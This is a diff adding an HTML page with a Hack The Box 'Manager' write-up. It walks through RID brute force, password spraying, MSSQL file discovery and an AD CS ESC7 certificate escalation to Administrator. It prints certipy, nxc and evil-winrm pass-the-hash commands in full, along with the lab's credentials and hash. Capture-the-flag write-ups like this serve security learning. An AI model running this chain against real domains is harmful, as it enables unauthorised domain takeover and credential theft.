@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Manager | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Active Directory</p>
+      <h1>HTB Manager</h1>
+      <p class="headline">MSSQL file discovery, Raven credential exposure and AD CS ESC7</p>
+      <p class="meta">Medium - Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Manager exposes MSSQL and allows weak credential reuse after RID-based user enumeration. Access as <code>operator</code> leads to file discovery through SQL Server procedures and a web-exposed ZIP archive containing LDAP credentials for <code>raven</code>. Raven has dangerous Certificate Authority permissions, enabling an AD CS ESC7 attack: add Raven as an officer, enable SubCA, issue a pending Administrator certificate request and retrieve a certificate usable for Administrator authentication.</p>
+<h2>Enumeration and MSSQL Access</h2>
+<p>The host exposed a Windows domain controller surface plus HTTP and MSSQL.</p>
+<pre><code class="language-bash">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.66.119 -oG allPorts
+sudo nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49693,49721,49790,53631 -sCV -vvv 10.129.66.119 -oN Targeted</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513152923.png" alt="Manager attack path summary" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513153219.png" alt="Service enumeration" /></figure>
+<p>RID brute force disclosed several users.</p>
+<pre><code class="language-bash">nxc smb 10.129.66.119 -u &#39;anonymous&#39; -p &#39;&#39; --rid-brute</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513155616.png" alt="RID brute force results" /></figure>
+<p>Password spraying with usernames as passwords found valid credentials for <code>operator</code>.</p>
+<pre><code class="language-bash">nxc smb 10.129.66.119 -u users.txt -p users.txt --no-bruteforce
+mssqlclient.py manager/operator:operator@manager.htb -windows-auth</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513161243.png" alt="operator credential discovery" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513162610.png" alt="MSSQL login as operator" /></figure>
+<h2>File Discovery and Raven Credentials</h2>
+<p><code>xp_dirtree</code> exposed interesting web-accessible content. A ZIP archive was downloaded through the HTTP service and extracted.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513164041.png" alt="xp_dirtree file discovery" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513164312.png" alt="Archive extraction" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513164616.png" alt="old-conf.xml in archive" /></figure>
+<p><code>.old-conf.xml</code> contained credentials for <code>raven@manager.htb</code>.</p>
+<pre><code class="language-xml">&lt;user&gt;raven@manager.htb&lt;/user&gt;
+&lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513164728.png" alt="Raven credentials in XML" /></figure>
+<p>WinRM access as Raven succeeded.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513181317.png" alt="WinRM as Raven" /></figure>
+<h2>AD CS ESC7</h2>
+<p>Raven belonged to Certificate Service DCOM Access and had dangerous CA permissions.</p>
+<pre><code class="language-bash">certipy find -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.129.66.119 -stdout -vulnerable</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513182459.png" alt="Raven group and privilege context" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513182921.png" alt="Certipy ESC7 finding" /></figure>
+<p>Raven was added as an officer and the <code>SubCA</code> template was enabled.</p>
+<pre><code class="language-bash">certipy ca -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.129.66.119 -ca manager-dc01-ca -add-officer raven -debug
+certipy ca -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.129.66.119 -ca manager-dc01-ca -enable-template subca</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513184539.png" alt="Raven added as officer" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513184845.png" alt="SubCA template enabled" /></figure>
+<p>A certificate request for Administrator was submitted. The request failed due to template permissions, but the private key and request ID were retained.</p>
+<pre><code class="language-bash">certipy req -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.129.66.119 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513185209.png" alt="Denied request with request ID" /></figure>
+<p>The request was approved and retrieved.</p>
+<pre><code class="language-bash">certipy ca -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.129.66.119 -ca manager-dc01-ca -issue-request 21
+certipy req -u raven@manager.htb -p &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.129.66.119 -ca manager-dc01-ca -retrieve 21</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513190052.png" alt="Request issued" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260513190526.png" alt="Certificate retrieved" /></figure>
+<p>The Administrator certificate was used to recover the NT hash and authenticate via WinRM.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260514071816.png" alt="Administrator hash from certificate" /></figure>
+<pre><code class="language-bash">evil-winrm -i 10.129.66.119 -u &#39;Administrator&#39; -H &#39;ae5064c2f62317332c88629e025924ef&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/manager/Pasted%20image%2020260514072155.png" alt="Administrator shell" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>Weak username-as-password patterns remain practical in lab and enterprise environments.</li>
+<li>MSSQL can disclose filesystem paths that become reachable through HTTP.</li>
+<li>ESC7 is powerful when a low-privileged user can manage CA officer or certificate approval workflows.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
